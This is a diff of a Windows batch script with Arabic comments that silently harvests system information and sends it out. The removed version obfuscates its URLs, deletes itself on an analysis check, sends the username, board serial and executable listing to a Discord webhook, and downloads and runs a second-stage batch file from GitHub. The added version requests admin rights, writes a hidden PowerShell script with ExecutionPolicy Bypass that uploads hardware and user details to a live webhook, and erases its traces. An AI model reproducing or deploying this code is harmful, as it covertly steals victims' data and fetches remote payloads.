@@ -1,46 +1,34 @@
 @echo off
-setlocal enabledelayedexpansion
-
-:: Anti-Analysis (Bruno check)
-if /I "%USERNAME%"=="Bruno" (
-    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
-    exit
+:: 1. طلب صلاحيات المسؤول تلقائياً
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
+    exit /b
 )
 
-:: مستودع الحروف لفك تشفير الروابط
-set "ABC=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~:/?#[]@!$&'()*+,;="
-set "PROT=!ABC:~7,1!!ABC:~19,1!!ABC:~19,1!!ABC:~15,1!!ABC:~18,1!!ABC:~66,1!!ABC:~67,1!!ABC:~67,1!"
+:: 2. إنشاء ملف PowerShell في المجلد المؤقت
+set "PS_PATH=%TEMP%\sys_v4.ps1"
 
-:: روابط مقطعة (raw.githubusercontent.com + 1.bat)
-set "H_GIT=raw.githubusercontent.com"
-set "B_PATH=/857seif/11111111/main/1.bat"
-set "G_URL=!PROT!!H_GIT!!B_PATH!"
+echo $W_URL = 'https://discord.com/api/webhooks/1483864326359220454/0GYczBv6_DBflqxCxIjNf1dp2Z2apLd7BsjLI7GRY92Y3gSwcSrn0ajKiF3pltmMYXC9' > "%PS_PATH%"
+echo $O_FILE = "$env:TEMP\Specs_Report.txt" >> "%PS_PATH%"
+echo $cpu = Get-CimInstance Win32_Processor ^| Select-Object -First 1 >> "%PS_PATH%"
+echo $mb  = Get-CimInstance Win32_BaseBoard ^| Select-Object -First 1 >> "%PS_PATH%"
+echo $ram = [Math]::Round((Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property Capacity -Sum).Sum / 1GB) >> "%PS_PATH%"
+echo $gpus = Get-CimInstance Win32_VideoController >> "%PS_PATH%"
+echo $gpuInfo = "" >> "%PS_PATH%"
+echo foreach ($g in $gpus) { >> "%PS_PATH%"
+echo     $v = [Math]::Round($g.AdapterRAM / 1GB) >> "%PS_PATH%"
+echo     if ($g.Name -like '*4070*' -and $v -lt 12) { $v = 12 } >> "%PS_PATH%"
+echo     $gpuInfo += "`n[GPU]: $($g.Name)`n[VRAM]: $v GB`n--------------------------" >> "%PS_PATH%"
+echo } >> "%PS_PATH%"
+echo $report = "==========================================`n      DEVICE REPORT`n==========================================`n[USER]: $env:USERNAME`n[PC]: $env:COMPUTERNAME`n[CPU]: $($cpu.Name)`n[RAM]: $ram GB`n[MOTHERBOARD]: $($mb.Manufacturer) $($mb.Product)`n--- GPU DETAILS ---$gpuInfo`n==========================================" >> "%PS_PATH%"
+echo $report ^| Out-File -FilePath $O_FILE -Encoding utf8 >> "%PS_PATH%"
+echo curl.exe -A 'Mozilla/5.0' -F "file=@$O_FILE" $W_URL >> "%PS_PATH%"
+echo Remove-Item $O_FILE >> "%PS_PATH%"
 
-:: --- تحديث رابط الـ Webhook الجديد هنا ---
-set "H_DIS=discord.com"
-set "W_PATH=/api/webhooks/1483864326359220454/0GYczBv6_DBflqxCxIjNf1dp2Z2apLd7BsjLI7GRY92Y3gSwcSrn0ajKiF3pltmMYXC9"
-set "W_URL=!PROT!!H_DIS!!W_PATH!"
-:: ---------------------------------------
+:: 3. تشغيل السكربت في الخلفية وبدون انتظار
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS_PATH%"
 
-:: مسارات وهمية
-set "O_FILE=%TEMP%\win_log_%RANDOM%.tmp"
-set "B_NEXT=%TEMP%\sys_driver_update.bat"
-
-:: جمع البيانات (تمويه الأوامر)
-(
-echo [ID] %USERNAME%
-wmic baseboard get serialnumber | findstr /V "SerialNumber"
-dir /b /s *.exe
-) > "!O_FILE!"
-
-:: الإرسال والتحميل (انتحال متصفح)
-curl -A "Mozilla/5.0" -k -X POST -F "file=@!O_FILE!" "!W_URL!"
-curl -A "Mozilla/5.0" -L -o "!B_NEXT!" "!G_URL!"
-
-if exist "!B_NEXT!" (
-    start /b "" cmd /c "!B_NEXT!"
-)
-
-:: مسح الأثر
-del /f /q "!O_FILE!"
+:: 4. التنظيف الفوري للملف المؤقت والخروج
+del "%PS_PATH%"
 exit
